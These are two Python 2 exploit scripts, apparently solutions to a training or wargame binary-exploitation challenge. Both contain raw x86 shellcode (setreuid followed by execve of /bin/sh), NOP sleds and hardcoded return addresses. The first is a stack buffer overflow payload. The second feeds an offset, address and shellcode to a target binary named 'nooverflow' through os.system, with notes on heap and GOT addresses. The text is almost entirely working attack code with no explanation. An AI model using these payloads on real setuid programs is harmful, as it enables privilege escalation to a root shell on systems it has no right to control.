#!/usr/bin/env python2
import struct
shellcode = "\x31\xC0\xB0\x31\xCD\x80\x89\xC3\x89\xC1\x31\xC0\xB0\x46\xCD\x80" # setreuid
shellcode += "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80" # drop shell

eip = struct.pack("<I", 0xbffff4c0)

print "%s%s%s%s"%("A"*140, eip, "\x90"*2000, shellcode)

##################################################################################################################3

#!/usr/bin/env python2
import struct
import os
shellcode = "\x90"*1000                                                                      
shellcode += "\x31\xC0\xB0\x31\xCD\x80\x89\xC3\x89\xC1\x31\xC0\xB0\x46\xCD\x80" # setreuid   
shellcode += "\x31\xc0\xb0\x04\x04\x07\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80" # drop shell                                                      
                                                                                             
# malloc heap address:  0x804a008                                                            
# got.free:             0x80499d0                                                            
                                                                                                                                                                                          
                                                                                                                                                                                          offset = -398                                                                                

                                                                                                                                                                                          eip = struct.pack("<I", 0xbffff9e6)

#os.environ['shellcode'] = shellcode
os.system("/bin/bash -c '/home/rookie/nooverflow/nooverflow %d %s %s'"%(offset, eip, shellcode))
#os.system('/bin/bash')

